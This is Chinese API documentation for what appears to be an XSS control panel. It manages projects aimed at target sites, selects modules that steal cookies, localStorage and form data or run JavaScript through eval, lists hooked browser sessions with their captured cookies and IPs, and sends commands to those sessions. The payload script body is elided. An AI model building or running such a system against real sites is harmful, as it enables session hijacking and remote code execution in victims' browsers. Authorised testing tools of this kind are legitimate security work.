# 项目管理 API 文档

## 项目管理

### 创建项目
`POST /api/projects`
Authorization: Bearer <token>

**请求体:**
```json
{
  "name": "测试项目1",
  "description": "项目描述信息",
  "target_url": "https://example.com",
  "group": "生产环境",
  "enabled_modules": ["cookie", "localStorage", "forms", "eval"]
}
```
- `name` (string): 项目名称，必须唯一
- `description` (string): 项目描述信息
- `target_url` (string): 目标URL地址
- `group` (string): 项目分组名称
- `enabled_modules` (array): 启用的XSS攻击模块列表

**响应体:**
```json
{
  "status": "success",
  "message": "项目创建成功",
  "data": {
    "id": 1,
    "jid": "PROJ001",
    "name": "测试项目1",
    "description": "项目描述信息",
    "target_url": "https://example.com",
    "group": "生产环境",
    "status": "active",
    "enabled_modules": ["cookie", "localStorage", "forms", "eval"],
    "owner_id": 1,
    "created_at": "2025-08-30T14:00:00Z",
    "updated_at": "2025-08-30T14:00:00Z"
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述
- `data.id` (uint): 项目唯一标识
- `data.jid` (string): 项目编号
- `data.name` (string): 项目名称
- `data.description` (string): 项目描述
- `data.target_url` (string): 目标URL
- `data.group` (string): 项目分组
- `data.status` (string): 项目状态 ("active" | "inactive")
- `data.enabled_modules` (array): 启用的攻击模块
- `data.owner_id` (uint): 项目创建者ID
- `data.created_at` (string): 创建时间
- `data.updated_at` (string): 更新时间

### 获取所有项目
`GET /api/projects`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "jid": "PROJ001",
      "name": "测试项目1",
      "description": "项目描述信息",
      "target_url": "https://example.com",
      "group": "生产环境",
      "status": "active",
      "owner_id": 1,
      "session_count": 47,
      "active_sessions": 7,
      "created_at": "2025-08-30T14:00:00Z",
      "updated_at": "2025-08-30T14:00:00Z"
    }
  ]
}
```
- `status` (string): 操作状态，成功为 "success"
- `data` (array): 项目列表数组
- `data[].id` (uint): 项目唯一标识
- `data[].jid` (string): 项目编号
- `data[].name` (string): 项目名称
- `data[].description` (string): 项目描述
- `data[].target_url` (string): 目标URL
- `data[].group` (string): 项目分组
- `data[].status` (string): 项目状态
- `data[].owner_id` (uint): 创建者ID
- `data[].session_count` (uint): 总会话数
- `data[].active_sessions` (uint): 活跃会话数
- `data[].created_at` (string): 创建时间
- `data[].updated_at` (string): 更新时间

### 获取特定项目
`GET /api/projects/{project_id}`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "jid": "PROJ001",
    "name": "测试项目1",
    "description": "项目描述信息",
    "target_url": "https://example.com",
    "group": "生产环境",
    "status": "active",
    "enabled_modules": ["cookie", "localStorage", "forms", "eval"],
    "owner_id": 1,
    "session_count": 47,
    "active_sessions": 7,
    "created_at": "2025-08-30T14:00:00Z",
    "updated_at": "2025-08-30T14:00:00Z"
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `data.id` (uint): 项目唯一标识
- `data.jid` (string): 项目编号
- `data.name` (string): 项目名称
- `data.description` (string): 项目描述
- `data.target_url` (string): 目标URL
- `data.group` (string): 项目分组
- `data.status` (string): 项目状态
- `data.enabled_modules` (array): 启用的攻击模块
- `data.owner_id` (uint): 创建者ID
- `data.session_count` (uint): 总会话数
- `data.active_sessions` (uint): 活跃会话数
- `data.created_at` (string): 创建时间
- `data.updated_at` (string): 更新时间

### 更新项目
`PUT /api/projects/{project_id}`
Authorization: Bearer <token>

**请求体:**
```json
{
  "name": "更新的项目名",
  "description": "更新的描述",
  "target_url": "https://newexample.com",
  "group": "测试环境",
  "status": "inactive",
  "enabled_modules": ["cookie", "eval", "alert"]
}
```
- `name` (string): 项目名称
- `description` (string): 项目描述
- `target_url` (string): 目标URL
- `group` (string): 项目分组
- `status` (string): 项目状态 ("active" | "inactive")
- `enabled_modules` (array): 启用的攻击模块

**响应体:**
```json
{
  "status": "success",
  "message": "项目更新成功",
  "data": {
    "id": 1,
    "jid": "PROJ001",
    "name": "更新的项目名",
    "description": "更新的描述",
    "target_url": "https://newexample.com",
    "group": "测试环境",
    "status": "inactive",
    "enabled_modules": ["cookie", "eval", "alert"],
    "owner_id": 1,
    "updated_at": "2025-08-30T15:00:00Z"
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述
- `data` (object): 更新后的项目信息

### 删除项目
`DELETE /api/projects/{project_id}`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "message": "项目删除成功"
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述

## 项目会话管理

### 获取项目会话列表
`GET /api/projects/{project_id}/sessions`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": {
    "sessions": [
      {
        "id": 1,
        "jid": "UMG1GAT",
        "project_id": 1,
        "ip": "192.168.1.100",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "url": "https://example.com/page1",
        "status": "online",
        "group": "Chrome 139",
        "notes": "已上线",
        "cookie": "sessionid=abc123; userid=456",
        "event_type": "上线",
        "first_online": "2025-08-15T10:30:00Z",
        "last_online": "2025-08-18T15:20:00Z",
        "connection_count": 23,
        "created_at": "2025-08-15T10:30:00Z",
        "updated_at": "2025-08-18T15:20:00Z"
      }
    ],
    "total_sessions": 47,
    "active_sessions": 7
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `data.sessions` (array): 会话列表
- `data.sessions[].id` (uint): 会话唯一标识
- `data.sessions[].jid` (string): 会话编号
- `data.sessions[].project_id` (uint): 所属项目ID
- `data.sessions[].ip` (string): 客户端IP地址
- `data.sessions[].user_agent` (string): 浏览器用户代理
- `data.sessions[].url` (string): 当前页面URL
- `data.sessions[].status` (string): 会话状态 ("online" | "offline")
- `data.sessions[].group` (string): 浏览器分组信息
- `data.sessions[].notes` (string): 备注信息
- `data.sessions[].cookie` (string): Cookie信息
- `data.sessions[].event_type` (string): 事件类型
- `data.sessions[].first_online` (string): 首次上线时间
- `data.sessions[].last_online` (string): 最后上线时间
- `data.sessions[].connection_count` (uint): 连接次数
- `data.total_sessions` (uint): 总会话数统计
- `data.active_sessions` (uint): 活跃会话数统计

### 获取特定会话详情
`GET /api/sessions/{session_id}`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "jid": "UMG1GAT",
    "project_id": 1,
    "project_name": "测试项目1",
    "ip": "192.168.1.100",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "url": "https://example.com/page1",
    "status": "online",
    "group": "Chrome 139",
    "notes": "已上线",
    "cookie": "sessionid=abc123; userid=456",
    "event_type": "上线",
    "first_online": "2025-08-15T10:30:00Z",
    "last_online": "2025-08-18T15:20:00Z",
    "connection_count": 23,
    "created_at": "2025-08-15T10:30:00Z",
    "updated_at": "2025-08-18T15:20:00Z"
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `data.id` (uint): 会话唯一标识
- `data.jid` (string): 会话编号
- `data.project_id` (uint): 所属项目ID
- `data.project_name` (string): 所属项目名称
- `data.ip` (string): 客户端IP地址
- `data.user_agent` (string): 浏览器用户代理
- `data.url` (string): 当前页面URL
- `data.status` (string): 会话状态
- `data.group` (string): 浏览器分组
- `data.notes` (string): 备注信息
- `data.cookie` (string): Cookie信息
- `data.event_type` (string): 事件类型
- `data.first_online` (string): 首次上线时间
- `data.last_online` (string): 最后上线时间
- `data.connection_count` (uint): 连接次数

## XSS攻击模块配置

### 获取可用攻击模块
`GET /api/xss-modules`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": [
    {
      "name": "cookie",
      "display_name": "Cookie获取",
      "description": "获取页面Cookie信息",
      "category": "信息收集"
    },
    {
      "name": "localStorage",
      "display_name": "本地存储",
      "description": "获取localStorage数据",
      "category": "信息收集"
    },
    {
      "name": "forms",
      "display_name": "表单信息",
      "description": "获取页面表单数据",
      "category": "信息收集"
    },
    {
      "name": "eval",
      "display_name": "代码执行",
      "description": "执行自定义JavaScript代码",
      "category": "代码执行"
    },
    {
      "name": "alert",
      "display_name": "弹窗提示",
      "description": "显示弹窗消息",
      "category": "界面操作"
    }
  ]
}
```
- `status` (string): 操作状态，成功为 "success"
- `data` (array): 可用模块列表
- `data[].name` (string): 模块名称标识
- `data[].display_name` (string): 模块显示名称
- `data[].description` (string): 模块功能描述
- `data[].category` (string): 模块分类

### 更新项目攻击模块配置
`PUT /api/projects/{project_id}/modules`
Authorization: Bearer <token>

**请求体:**
```json
{
  "enabled_modules": ["cookie", "localStorage", "eval", "alert"]
}
```
- `enabled_modules` (array): 要启用的攻击模块名称列表

**响应体:**
```json
{
  "status": "success",
  "message": "模块配置更新成功",
  "data": {
    "project_id": 1,
    "enabled_modules": ["cookie", "localStorage", "eval", "alert"]
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述
- `data.project_id` (uint): 项目ID
- `data.enabled_modules` (array): 更新后的启用模块列表

## 项目统计

### 获取项目统计信息
`GET /api/projects/{project_id}/stats`
Authorization: Bearer <token>

**响应体:**
```json
{
  "status": "success",
  "data": {
    "project_id": 1,
    "total_sessions": 47,
    "active_sessions": 7,
    "today_sessions": 12,
    "unique_ips": 25,
    "browser_stats": {
      "Chrome": 30,
      "Firefox": 10,
      "Safari": 5,
      "Edge": 2
    },
    "hourly_stats": [
      {"hour": "00", "count": 2},
      {"hour": "01", "count": 1},
      {"hour": "14", "count": 7}
    ]
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `data.project_id` (uint): 项目ID
- `data.total_sessions` (uint): 总会话数
- `data.active_sessions` (uint): 当前活跃会话数
- `data.today_sessions` (uint): 今日新增会话数
- `data.unique_ips` (uint): 唯一IP数量
- `data.browser_stats` (object): 浏览器统计信息
- `data.hourly_stats` (array): 每小时统计数据
- `data.hourly_stats[].hour` (string): 小时 (00-23)
- `data.hourly_stats[].count` (uint): 该小时的会话数

### 获取项目载荷脚本
`GET /api/projects/{project_id}/payload`
Authorization: Bearer <token>

**响应体:**
```javascript
(function() {
    const PROJECT_ID = 1;
    const SERVER_URL = 'ws://localhost:8088/ws';
    const ENABLED_MODULES = ['cookie', 'localStorage', 'forms', 'eval'];
    
    // XSS载荷代码...
    // 只包含该项目启用的攻击模块
})();
```
- 返回针对特定项目定制的XSS载荷脚本
- 只包含该项目启用的攻击模块功能
- 自动包含项目ID用于会话关联

## 会话操作

### 向项目所有会话发送命令
`POST /api/projects/{project_id}/commands`
Authorization: Bearer <token>

**请求体:**
```json
{
  "command": "cookie",
  "params": {}
}
```
- `command` (string): 命令类型
- `params` (object): 命令参数

**响应体:**
```json
{
  "status": "success",
  "message": "命令发送完成，收到 7 个结果",
  "data": {
    "project_id": 1,
    "command": "cookie",
    "results": [
      {
        "session_id": "UMG1GAT",
        "result": "sessionid=abc123; userid=456",
        "timestamp": "2025-08-30T15:00:00Z"
      }
    ],
    "total_sent": 7,
    "total_received": 7
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述
- `data.project_id` (uint): 项目ID
- `data.command` (string): 执行的命令
- `data.results` (array): 执行结果列表
- `data.results[].session_id` (string): 会话ID
- `data.results[].result` (string): 执行结果
- `data.results[].timestamp` (string): 执行时间
- `data.total_sent` (uint): 发送命令数量
- `data.total_received` (uint): 收到结果数量

### 向特定会话发送命令
`POST /api/sessions/{session_id}/commands`
Authorization: Bearer <token>

**请求体:**
```json
{
  "command": "eval",
  "params": {
    "code": "document.title"
  }
}
```
- `command` (string): 命令类型
- `params` (object): 命令参数

**响应体:**
```json
{
  "status": "success",
  "message": "命令执行成功",
  "data": {
    "session_id": "UMG1GAT",
    "command": "eval",
    "result": "测试页面标题",
    "timestamp": "2025-08-30T15:00:00Z"
  }
}
```
- `status` (string): 操作状态，成功为 "success"
- `message` (string): 操作结果描述
- `data.session_id` (string): 会话ID
- `data.command` (string): 执行的命令
- `data.result` (string): 执行结果
- `data.timestamp` (string): 执行时间